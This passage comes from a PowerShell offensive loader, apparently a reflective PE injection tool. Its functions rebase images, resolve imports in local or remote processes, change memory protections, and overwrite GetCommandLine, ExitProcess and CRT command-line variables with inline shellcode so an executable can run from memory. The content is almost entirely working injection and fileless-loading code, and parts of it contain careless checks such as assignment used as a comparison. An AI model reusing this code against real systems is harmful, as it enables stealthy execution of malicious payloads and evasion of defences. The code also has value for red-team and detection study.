			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
